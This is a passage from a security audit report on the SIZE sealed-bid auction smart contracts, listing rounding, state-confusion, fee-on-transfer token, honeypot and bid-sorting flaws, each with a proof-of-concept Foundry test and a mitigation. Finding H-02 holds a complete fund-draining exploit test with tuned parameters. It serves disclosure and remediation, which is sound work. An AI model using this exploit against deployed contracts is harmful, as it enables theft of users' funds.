82. slowmoses\n  83. tnevler\n  84. tonisives\n  85. trustindistrust\n  86. wagmi\n  87. yixxas\n  88. zapaz\n\nThis contest was judged by [0xean](https://github.com/0xean).\n\nFinal report assembled by [CloudEllie](https://twitter.com/CloudEllie1).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 9 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 7 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 29 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 31 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 SIZE contest repository](https://github.com/code-423n4/2022-11-size), and is composed of 4 smart contracts written in the Solidity programming language and includes 485 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (2)\n## [[H-01] Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.](https://github.com/code-423n4/2022-11-size-findings/issues/94)\n*Submitted by [hansfriese](https://github.com/code-423n4/2022-11-size-findings/issues/94), also found by [ktg](https://github.com/code-423n4/2022-11-size-findings/issues/144)*\n\nBidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.\n\nThe main flaw is the seller might receive more quote tokens than the bidders offer after the auction was finalized.\n\nIf there is no other auctions to use the same quote token, the last bidder will fail to withdraw his funds because the contract doesn't have enough balance of quote token.\n\n### Proof of Concept\n\nAfter the auction was finalized, the seller receives the `filledQuote` amount of quote token using [data.filledBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325).\n\n```solidity\n    // Calculate quote amount based on clearing price\n    uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);\n```\n\nBut when the bidders withdraw the funds using `withdraw()`, they offer the quote token [using this formula](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L375-L382).\n\n```solidity\n    // Refund unfilled quoteAmount on first withdraw\n    if (b.quoteAmount != 0) {\n        uint256 quoteBought = FixedPointMathLib.mulDivDown(baseAmount, a.data.lowestQuote, a.data.lowestBase);\n        uint256 refundedQuote = b.quoteAmount - quoteBought;\n        b.quoteAmount = 0;\n\n        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, refundedQuote);\n    }\n```\n\nEven if they use the same clearing price, the total amount of quote token that the bidders offer might be less than the amount that the seller charged during finalization because the round down would happen several times with the bidders.\n\nThis is the test to show the scenario.\n\n```solidity\n    function testAuditBidderMoneyLock() public {\n        // in this scenario, we show that bidder's money can be locked due to inaccurate calculation of claimed quote tokens for a seller\n        uint128 K = 1 ether;\n        baseToSell = 4*K;\n        uint256 aid = seller.createAuction(\n            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n        );\n\n        bidder1.setAuctionId(aid);\n        bidder1.bidOnAuctionWithSalt(3*K, 3*K+2, \"Honest bidder\");\n        bidder2.setAuctionId(aid);\n        bidder2.bidOnAuctionWithSalt(2*K, 2*K+1, \"Honest bidder\");\n\n        vm.warp(endTime);\n\n        uint256[] memory bidIndices = new uint[](2);\n        bidIndices[0] = 0;\n        bidIndices[1] = 1;\n\n        seller.finalize(bidIndices, 2*K, 2*K+1);\n        emit log_string(\"Seller claimed\");\n        // seller claimed 4*K+2\n        assertEq(quoteToken.balanceOf(address(seller)), 4*K+2);\n        // contract has K+1 quote token left\n        assertEq(quoteToken.balanceOf(address(auction)), K+1);\n\n        // bidder1 withdraws\n        bidder1.withdraw();\n        emit log_string(\"Bidder 1 withdrew\");\n        // contract has K quote token left\n        assertEq(quoteToken.balanceOf(address(auction)), K);\n        // bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens\n        // but the protocol reverts because of insufficient quote tokens\n        bidder2.withdraw();\n        emit log_string(\"Bidder 2 withdrew\"); // will not happen\n    }\n```\n\nThe test result shows the seller charged more quote token than the bidders offer so the last bidder can't withdraw his unused quote token because the contract doesn't have enough balance.\n\n```solidity\n    Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest\n    [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)\n    Logs:\n    Seller claimed\n    Bidder 1 withdrew\n\n    Test result: FAILED. 0 passed; 1 failed; finished in 6.94ms\n\n    Failing tests:\n    Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest\n    [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nCurrently, the `FinalizeData` struct contains the `filledBase` only and calculates the `filledQuote` using the clearing price.\n\n```solidity\n    struct FinalizeData {\n        uint256 reserveQuotePerBase;\n        uint128 totalBaseAmount;\n        uint128 filledBase;\n        uint256 previousQuotePerBase;\n        uint256 previousIndex;\n    }\n```\n\nI think we should add one more field `filledQuote` and update it during auction finalization.\n\nAnd the seller can recieve the sum of `filledQuote` of all bidders to avoid the rounding issue.\n\nAlso, each bidder can pay the `filledQuote` of quote token and receive the `filledBase` of base token without calculating again using the clearing price.\n\n**[RagePit (SIZE) confirmed](https://github.com/code-423n4/2022-11-size-findings/issues/94#issuecomment-1319190203)**\n\n***\n\n## [[H-02] Attacker can steal any funds in the contract by state confusion (no preconditions)](https://github.com/code-423n4/2022-11-size-findings/issues/252)\n*Submitted by [Trust](https://github.com/code-423n4/2022-11-size-findings/issues/252), also found by [V\\_B](https://github.com/code-423n4/2022-11-size-findings/issues/333), [cryptonue](https://github.com/code-423n4/2022-11-size-findings/issues/304), [PwnedNoMore](https://github.com/code-423n4/2022-11-size-findings/issues/213), [KIntern\\_NA](https://github.com/code-423n4/2022-11-size-findings/issues/200), [fs0c](https://github.com/code-423n4/2022-11-size-findings/issues/171), [cryptphi](https://github.com/code-423n4/2022-11-size-findings/issues/164), [bin2chen](https://github.com/code-423n4/2022-11-size-findings/issues/141), [JTJabba](https://github.com/code-423n4/2022-11-size-findings/issues/134), [HE1M](https://github.com/code-423n4/2022-11-size-findings/issues/128), [Picodes](https://github.com/code-423n4/2022-11-size-findings/issues/124), [hansfriese](https://github.com/code-423n4/2022-11-size-findings/issues/96), [KingNFT](https://github.com/code-423n4/2022-11-size-findings/issues/86), [R2](https://github.com/code-423n4/2022-11-size-findings/issues/71), [M4TZ1P](https://github.com/code-423n4/2022-11-size-findings/issues/46), and [8olidity](https://github.com/code-423n4/2022-11-size-findings/issues/15)*\n\nHIGH: Attacker can steal any funds in the contract by state confusion (no preconditions).<br>\nLOC:<br>\n<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33><br>\n<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238>\n\nAuctions in SIZE can be in one of several states, as checked in the atState() modifier:\n\n    modifier atState(Auction storage a, States _state) {\n        if (block.timestamp < a.timings.startTimestamp) {\n            if (_state != States.Created) revert InvalidState();\n        } else if (block.timestamp < a.timings.endTimestamp) {\n            if (_state != States.AcceptingBids) revert InvalidState();\n        } else if (a.data.lowestQuote != type(uint128).max) {\n            if (_state != States.Finalized) revert InvalidState();\n        } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {\n            if (_state != States.RevealPeriod) revert InvalidState();\n        } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {\n            if (_state != States.Voided) revert InvalidState();\n        } else {\n            revert();\n        }\n        _;\n    }\n\nIt's important to note that if current block timestamp is greater than endTimestamp, `a.data.lowestQuote` is used to determine if finalize() was called.\n\nThe value is set to max at createAuction.\nIn finalize, it is set again, using user-controlled input:\n\n    // Last filled bid is the clearing price\n    a.data.lowestBase = clearingBase;\n    a.data.lowestQuote = clearingQuote;\n\nThe issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to `type(uint128).max`. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:\n\n    // Transfer the left over baseToken\n    if (data.totalBaseAmount != data.filledBase) {\n        uint128 unsoldBase = data.totalBaseAmount - data.filledBase;\n        a.params.totalBaseAmount = data.filledBase;\n        SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase);\n    }\n    // Calculate quote amount based on clearing price\n    uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);\n    SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote);\n\nCritically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:\n\n    function cancelAuction(uint256 auctionId) external {\n        Auction storage a = idToAuction[auctionId];\n        if (msg.sender != a.data.seller) {\n            revert UnauthorizedCaller();\n        }\n        // Only allow cancellations before finalization\n        // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)\n        if (a.data.lowestQuote != type(uint128).max) {\n            revert InvalidState();\n        }\n        // Allowing bidders to cancel bids (withdraw quote)\n        // Auction considered forever States.AcceptingBids but nobody can finalize\n        a.data.seller = address(0);\n        a.timings.endTimestamp = type(uint32).max;\n        emit AuctionCancelled(auctionId);\n        SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount);\n    }\n\n    function cancelBid(uint256 auctionId, uint256 bidIndex)\n        external\n    {\n        Auction storage a = idToAuction[auctionId];\n        EncryptedBid storage b = a.bids[bidIndex];\n        if (msg.sender != b.sender) {\n            revert UnauthorizedCaller();\n        }\n        // Only allow bid cancellations while not finalized or in the reveal period\n        if (block.timestamp >= a.timings.endTimestamp) {\n            if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {\n                revert InvalidState();\n            }\n        }\n        // Prevent any futher access to this EncryptedBid\n        b.sender = address(0);\n        // Prevent seller from finalizing a cancelled bid\n        b.commitment = 0;\n        emit BidCancelled(auctionId, bidIndex);\n        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount);\n    }\n\nThe attack will look as follows:\n\n1.  attacker uses two contracts - buyer and seller\n2.  seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens.\n3.  buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X.\n4.  after 1 second, seller calls reveal() and finalizes, with **lowestQuote = lowestBase = 2&ast;&ast;128-1**.\n5.  seller contract receives X-Y unsold base tokens and Y quote tokens\n6.  seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = `type(uint32).max`\n7.  buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens.\n8.  The accounting shows attacker profited Y quote tokens, which are both in buyer and seller's contract.\n\nNote that the values of `minimumBidQuote`, `reserveQuotePerbase` must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.\n\nThis was the main constraint to bypass:\n\n    uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);\n    ...\n    data.previousQuotePerBase = quotePerBase;\n    ...\n    if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {\n                revert InvalidCalldata();\n            }\n\nSince clearingQuote must equal UINT128\\_MAX, we must satisfy:\n(2&ast;&ast;128-1) &ast; (2&ast;&ast;128-1) / clearingBase = quoteAmount &ast; (2&ast;&ast;128-1) / baseAmount. The solution I found was setting clearingBase to (2&ast;&ast;128-1) and quoteAmount = baseAmount.\n\nWe also have constraints on reserveQuotePerBase. In createAuction:\n\n    if (\n        FixedPointMathLib.mulDivDown(\n            auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount\n        ) > auctionParams.reserveQuotePerBase\n    ) {\n        revert InvalidReserve();\n    }\n\nWhile in finalize():\n\n    // Only fill if above reserve price\n    if (quotePerBase < data.reserveQuotePerBase) continue;\n\nAnd an important constraint on quoteAmount and minimumBidQuote:\n\n    if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {\n        revert InvalidBidAmount();\n    }\n\nMerging them gives us two equations to substitute variables in:\n\n1.  `minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBase`\n2.  `quoteAmount > minimumBidQuote`\n\nIn the POC I've crafted parameters to steal 2&ast;&ast;30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.\n\n### Impact\n\nAn attacker can steal all tokens held in the SIZE auction contract.\n\n### Proof of Concept\n\nCopy the following code in SizeSealed.t.sol\n\n    function testAttack() public {\n        quoteToken = new MockERC20(\"USD Coin\", \"USDC\", 6);\n        baseToken = new MockERC20(\"DAI stablecoin \", \"DAI\", 18);\n        // Bootstrap auction contract with some funds\n        baseToken.mint(address(auction), 1e20);\n        quoteToken.mint(address(auction), 1e12);\n        // Create attacker\n        MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);\n        MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);\n        // Print attacker balances\n        uint256 balance_quote;\n        uint256 balance_base;\n        (balance_quote, balance_base) = attacker_seller.balances();\n        console.log(\"Starting seller balance: \", balance_quote, balance_base);\n        (balance_quote, balance_base) = attacker_buyer.balances();\n        console.log('Starting buyer balance: ', balance_quote, balance_base);\n        // Create auction\n        uint256 auction_id = attacker_seller.createAuction(\n            2**32,  // totalBaseAmount\n            2**120, // reserveQuotePerBase\n            2**20, // minimumBidQuote\n            uint32(block.timestamp), // startTimestamp\n            uint32(block.timestamp + 1),  // endTimestamp\n            uint32(block.timestamp + 1), // vestingStartTimestamp\n            uint32(block.timestamp + 1), // vestingEndTimestamp\n            0 // cliffPercent\n        );\n        // Bid on auction\n        attacker_buyer.setAuctionId(auction_id);\n        attacker_buyer.bidOnAuction(\n            2**30, // baseAmount\n            2**30  // quoteAmount\n        );\n        // Finalize with clearingQuote = clearingBase = 2**128-1\n        // Will transfer unsold base amount + matched quote amount\n        uint256[] memory bidIndices = new uint[](1);\n        bidIndices[0] = 0;\n        vm.warp(block.timestamp + 10);\n        attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);\n        // Cancel auction\n        // Will transfer back sold base amount\n        attacker_seller.cancelAuction();\n        // Cancel bid\n        // Will transfer back to buyer quoteAmount\n        attacker_buyer.cancel();\n        // Net profit of quoteAmount tokens of quoteToken\n        (balance_quote, balance_base) = attacker_seller.balances();\n        console.log(\"End seller balance: \", balance_quote, balance_base);\n        (balance_quote, balance_base) = attacker_buyer.balances();\n        console.log('End buyer balance: ', balance_quote, balance_base);\n    }\n\n### Tools Used\n\nManual audit, foundry tests\n\n### Recommended Mitigation Steps\n\nDo not trust the value of `lowestQuote` when determining the finalize state, use a dedicated state variable for it.\n\n\n**[RagePit (SIZE) confirmed](https://github.com/code-423n4/2022-11-size-findings/issues/252#issuecomment-1316061426)**\n\n\n***\n\n \n# Medium Risk Findings (7)\n## [[M-01] Incompatibility with fee-on-transfer/inflationary/deflationary/rebasing tokens, on both base tokens and quote tokens, with varying impacts](https://github.com/code-423n4/2022-11-size-findings/issues/47)\n*Submitted by [neko\\_nyaa](https://github.com/code-423n4/2022-11-size-findings/issues/47), also found by [&lowbar;141345&lowbar;](https://github.com/code-423n4/2022-11-size-findings/issues/250), [0x52](https://github.com/code-423n4/2022-11-size-findings/issues/23), [0xc0ffEE](https://github.com/code-423n4/2022-11-size-findings/issues/235), [0xSmartContract](https://github.com/code-423n4/2022-11-size-findings/issues/137), [c7e7eff](https://github.com/code-423n4/2022-11-size-findings/issues/205), [cccz](https://github.com/code-423n4/2022-11-size-findings/issues/19), [cryptostellar5](https://github.com/code-423n4/2022-11-size-findings/issues/206), [fs0c](https://github.com/code-423n4/2022-11-size-findings/issues/79), [hansfriese](https://github.com/code-423n4/2022-11-size-findings/issues/98), [horsefacts](https://github.com/code-423n4/2022-11-size-findings/issues/145), [Josiah](https://github.com/code-423n4/2022-11-size-findings/issues/301), [KingNFT](https://github.com/code-423n4/2022-11-size-findings/issues/87), [ladboy233](https://github.com/code-423n4/2022-11-size-findings/issues/17), [Lambda](https://github.com/code-423n4/2022-11-size-findings/issues/63), [minhtrng](https://github.com/code-423n4/2022-11-size-findings/issues/220), [pashov](https://github.com/code-423n4/2022-11-size-findings/issues/300), [R2](https://github.com/code-423n4/2022-11-size-findings/issues/73), [RaymondFam](https://github.com/code-423n4/2022-11-size-findings/issues/9), [Ruhum](https://github.com/code-423n4/2022-11-size-findings/issues/55), [rvierdiiev](https://github.com/code-423n4/2022-11-size-findings/issues/116), [sashik_eth](https://github.com/code-423n4/2022-11-size-findings/issues/316), [TomJ](https://github.com/code-423n4/2022-11-size-findings/issues/223), [tonisives](https://github.com/code-423n4/2022-11-size-findings/issues/169), [Trust](https://github.com/code-423n4/2022-11-size-findings/issues/255), [TwelveSec](https://github.com/code-423n4/2022-11-size-findings/issues/221), and [wagmi](https://github.com/code-423n4/2022-11-size-findings/issues/226).*\n\n<https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163><br>\n<https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L105>\n\nThe following report describes two issues with how the `SizeSealed` contract incorrectly handles several so-called \"weird ERC20\" tokens, in which the token's balance can change unexpectedly:\n\n*   How the contract cannot handle fee-on-transfer base tokens, and\n*   How the contract incorrectly handles unusual ERC20 tokens in general, with stated impact.\n\n#### Base tokens\n\nLet us first note how the contract attempts to handle sudden balance change to the `baseToken`:\n\n<https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L105>\n\n```solidity\nuint256 balanceBeforeTransfer = ERC20(auctionParams.baseToken).balanceOf(address(this));\n\nSafeTransferLib.safeTransferFrom(\n    ERC20(auctionParams.baseToken), msg.sender, address(this), auctionParams.totalBaseAmount\n);\n\nuint256 balanceAfterTransfer = ERC20(auctionParams.baseToken).balanceOf(address(this));\nif (balanceAfterTransfer - balanceBeforeTransfer != auctionParams.totalBaseAmount) {\n    revert UnexpectedBalanceChange();\n}\n```\n\nThe effect is that the operation will revert with the error `UnexpectedBalanceChange()` if the received amount is different from what was transferred.\n\n#### Quote tokens\n\nUnlike base tokens, there is no such check when transferring the `quoteToken` from the bidder:\n\n<https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163>\n\n```solidity\nSafeTransferLib.safeTransferFrom(ERC20(a.params.quoteToken), msg.sender, address(this), quoteAmount);\n```\n\nSince [line 150](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L150) stores the `quoteAmount` as a state variable, which will be used later on during outgoing transfers (see following lines), this results in incorrect state handling.\n\nIt is worth noting that this will effect **all** functions with outgoing transfers, due to reliance on storage values.\n\n*   <https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L327>\n*   <https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L351>\n*   <https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L381>\n*   <https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L439>\n\n### Proof of concept\n\nConsider the following scenario, describing the issue with both token types:\n\n1.  Alice places an auction, her base token is a rebasing token (e.g. aToken from Aave).\n2.  Bob places a bid with `1e18` quote tokens. This quote token turns out to be a fee-on-transfer token, and the contract actually received `1e18 - fee`.\n3.  Some time later, Alice cancels the auction and withdraws her aTokens.\n4.  Bob is now unable to withdraw his bid, due to failed transfers for the contract not having enough balance.\n\nFor Alice's situation, she is able to recover her original amount. However, since aTokens increases one's own balance over time, the \"interest\" amount is permanently locked in the contract.\n\nBob's situation is somewhat more recoverable, as he can simply send more tokens to the contract itself, so that the contract's balance is sufficient to refund Bob his tokens. However, given that Bob now has to incur more transfer fees to get his own funds back, I consider this a leakage of value.\n\nIt is worth noting that similar impacts **will happen to successful auctions** as well, although it is a little more complicated, and that it varies in the matter of who is affected.\n\n### Impact\n\nFor the base token:\n\n*   For fee-on-transfer tokens, the contract is simply unusable on these tokens.\n    *   There exists [many](https://github.com/d-xo/weird-erc20#fee-on-transfer) popular fee-on-transfer tokens, and potential tokens where the fees may be switched on in the future.\n*   For rebasing tokens, part of the funds may be permanently locked in the contract.\n\nFor the quote token:\n\n*   If the token is a fee-on-transfer, or anything that results in the contract holding lower amount than stored, then this actually results in a denial-of-service, since outgoing transfers in e.g. `withdraw()` will fail due to insufficient balance.\n    *   This may get costly to recover if a certain auction is popular, but is cancelled, so the last bidder to withdraw takes all the damage.\n    *   This can also be considered fund loss due to quote tokens getting stuck in the contract.\n*   For rebasing tokens, part of the funds may be permanently locked in the contract (same effect as base token).\n\n### Remarks\n\nWhile technically two separate issues are described, they do have many overlappings, and both comes down to correct handling of unusual ERC20 tokens, hence I have decided to combine these into a single report.\n\nAnother intention was to highlight the similarities and differences between balance handling of base tokens and quote tokens, which actually has given rise to part of the issue itself.\n\n### Recommended Mitigation Steps\n\nFor both issues:\n\n*   Consider warning the users about the possibility of fund loss when using rebasing tokens as the quote token.\n*   Adding ERC20 recovering functions is an option, however this should be done carefully, so as not to accidentally pull out base or quote tokens from ongoing auctions.\n\nFor the base token issue:\n\n*   Consider using two parameters for transferring base tokens: e.g. `amountToTransferIn` for the amount to be pulled in, and `auctionParams.totalBaseAmount` for the actual amount received, then check the received amount is appropriate.\n    *   The calculation for these two amount should be the auction creator's responsibility, however this can be made a little easier for them by checking amount received is at least `auctionParams.totalBaseAmount` instead of exact, and possibly transferring the surplus amount back to the creator.\n\nFor the quote token issue:\n\n*   Consider adding a check for `quoteAmount` to be correctly transferred, or check the actual amount transferred in the contract instead of using the function parameter, or something similar to the base token's mitigation.\n\nAdditionally, consider using a separate internal function for pulling tokens, to ensure correct transfers.\n\n**[0xean (judge) commented on duplicate issue #255](https://github.com/code-423n4/2022-11-size-findings/issues/255#issuecomment-1308961688):**\n> debating between M and H on this one. Currently leaning towards H since there is a direct loss of funds and no documentation stating these types of tokens aren't supported (nor checks to disable them).\n> \n> using this issue to gather all of the various manifestations of \"special\" ERC20 tokens not being supported. While rebasing tokens would need to be handled differently than fee on transfer, the underlying issue is close enough to not separate them all out\n\n**[Ragepit (SIZE) confirmed duplicate issue #255](https://github.com/code-423n4/2022-11-size-findings/issues/255#issuecomment-1321291800)**\n\n**[0xean (judge) commented on duplicate issue #255](https://github.com/code-423n4/2022-11-size-findings/issues/255#issuecomment-1335312641):**\n> Thought about this one more and look back at some similar past findings from myself and other judges and feel that M is the correct severity here.\n> [code-423n4/org#3](code-423n4/org#3) for a conversation on the topic.\n\n\n***\n\n## [[M-02] Solmate's ERC20 does not check for token contract's existence, which opens up possibility for a honeypot attack](https://github.com/code-423n4/2022-11-size-findings/issues/48)\n*Submitted by [neko\\_nyaa](https://github.com/code-423n4/2022-11-size-findings/issues/48), also found by [8olidity](https://github.com/code-423n4/2022-11-size-findings/issues/45), [Bnke0x0](https://github.com/code-423n4/2022-11-size-findings/issues/72), [brgltd](https://github.com/code-423n4/2022-11-size-findings/issues/318), [ctf&lowbar;sec](https://github.com/code-423n4/2022-11-size-findings/issues/33), [djxploit](https://github.com/code-423n4/2022-11-size-findings/issues/309), [horsefacts](https://github.com/code-423n4/2022-11-size-findings/issues/146), [jayphbee](https://github.com/code-423n4/2022-11-size-findings/issues/231), [Matin](https://github.com/code-423n4/2022-11-size-findings/issues/268), and [TwelveSec](https://github.com/code-423n4/2022-11-size-findings/issues/222).*\n\nWhen bidding, the contract pulls the quote token from the bidder to itself.\n\n<https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L163>\n\n```solidity\nSafeTransferLib.safeTransferFrom(ERC20(a.params.quoteToken), msg.sender, address(this), quoteAmount);\n```\n\nHowever, since the contract uses Solmate's [SafeTransferLib](https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol#L9)\n\n> /// @dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.\n\nTherefore if the token address is empty, the transfer will succeed silently, but not crediting the contract with any tokens.\n\nThis error opens up room for a honeypot attack similar to the [Qubit Finance hack](https://halborn.com/explained-the-qubit-hack-january-2022/) in January 2022.\n\nIn particular, it has became popular for protocols to deploy their token across multiple networks using the same deploying address, so that they can control the address nonce and ensuring a consistent token address across different networks.\n\nE.g. **1INCH** has the same token address on Ethereum and BSC, and GEL token has the same address on Ethereum, Fantom and Polygon. There are other protocols have same contract addresses across different chains, and it's not hard to imagine such thing for their protocol token too, if any.\n\n### Proof of Concept\n\nAssuming that Alice is the attacker, Bob is the victim. Alice has two accounts, namely Alice1 and Alice2. Denote token Q as the quote token.\n\n0.  **Token Q has been launched on other chains, but not on the local chain yet.** It is expected that token Q will be launched on the local chain with a consistent address as other chains.\n1.  Alice1 places an auction with some `baseToken`, and a token Q as the `quoteToken`.\n2.  Alice2 places a bid with `1000e18` quote tokens.\n    *   The transfer succeeds, but the contract is not credited any tokens.\n3.  **Token Q is launched on the local chain.**\n4.  Bob places a bid with `1001e18` quote tokens.\n5.  Alice2 cancels her own bid, recovering her (supposedly) `1000e18` refund bid back.\n6.  Alice1 cancels her auction, recovering her base tokens back.\n\nAs a result, the contract's Q token balance is `1e18`, Alice gets away with all her base tokens and `1000e18` Q tokens that are Bob's. Alice has stolen Bob's funds.\n\n### Recommended Mitigation Steps\n\nConsider using OpenZeppelin's SafeERC20 instead, which has checks that an address does indeed have a contract.\n\n\n**[Ragepit (SIZE) confirmed and commented on duplicate issue #318](https://github.com/code-423n4/2022-11-size-findings/issues/318#issuecomment-1319229833):**\n> Incredibly unlikely but confirming as Medium given the good argument in [#48](https://github.com/code-423n4/2022-11-size-findings/issues/48)\n\n\n***\n\n## [[M-03] The sorting logic is not strict enough](https://github.com/code-423n4/2022-11-size-findings/issues/97)\n*Submitted by [hansfriese](https://github.com/code-423n4/2022-11-size-findings/issues/97)*\n\nWhen the seller finalizes his auction, all bids are sorted according to the `quotePerBase` and it's calculated using the `FixedPointMathLib.mulDivDown()`.\n\nAnd the earliest bid will be used first for the same `quotePerBase` but this ratio is not strict enough so that the worse bid might be filled than the better one.\n\nAs a result, the seller might receive fewer quote token than he wants.\n\n### Proof of Concept\n\nThis is the test to show the scenario.\n\n```solidity\n    function testAuditWrongSorting() public {\n        // this test will show that it is possible the seller can not claim the best bid because of the inaccurate comparison in finalization\n        uint128 K = 1<<64;\n        baseToSell = K + 2;\n        uint256 aid = seller.createAuction(\n            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n        );\n\n        bidder1.setAuctionId(aid);\n        bidder1.bidOnAuctionWithSalt(K+1, K, \"Worse bidder\");\n        bidder2.setAuctionId(aid);\n        bidder2.bidOnAuctionWithSalt(K+2, K+1, \"Better bidder\"); // This is the better bid because (K+1)/(K+2) > K/(K+1)\n\n        vm.warp(endTime);\n\n        uint256[] memory bidIndices = new uint[](2);\n        bidIndices[0] = 1; // the seller is smart enough to choose the correct order to (1, 0)\n        bidIndices[1] = 0;\n\n        vm.expectRevert(ISizeSealed.InvalidSorting.selector);\n        seller.finalize(bidIndices, K+2, K+1); // this reverts because of #273\n\n        // next the seller is forced to call the finalize with parameter K+1, K preferring the first bidder\n        bidIndices[0] = 0;\n        bidIndices[1] = 1;\n        seller.finalize(bidIndices, K+1, K);\n\n        // at this point the seller gets K quote tokens while he could get K+1 quote tokens with the better bidder\n        assertEq(quoteToken.balanceOf(address(seller)), K);\n    }\n```\n\nThis is the output of the test.\n\n```solidity\n    Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest\n    [PASS] testAuditWrongSorting() (gas: 984991)\n    Test result: ok. 1 passed; 0 failed; finished in 7.22ms\n```\n\nWhen it calculates the [quotePerBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269), they are same each other with `(base, quote) = (K+1, K) and (K+2, K+1) when K = 1<<64`.\n\nSo the seller can receive `K+1` of the quote token but he got `K`.\n\nI think `K` is realistic enough with the 18 decimals token because K is around 18 &ast; 1e18.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nAs we can see from the test, it's not strict enough to compare bidders using `quotePerBase`.\n\nWe can compare them by multiplying them like below.\n\n$\\frac {quote1}{base1} >= \\frac{quote2}{base2} <=> quote1 &ast; base2 >= quote2 &ast; base1 $\n\nSo we can add 2 elements to `FinalizeData` struct and modify [this comparison](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277) like below.\n\n```solidity\n    struct FinalizeData {\n        uint256 reserveQuotePerBase;\n        uint128 totalBaseAmount;\n        uint128 filledBase;\n        uint256 previousQuotePerBase;\n        uint256 previousIndex;\n        uint128 previousQuote; //++++++++++++\n        uint128 previousBase; //+++++++++++\n    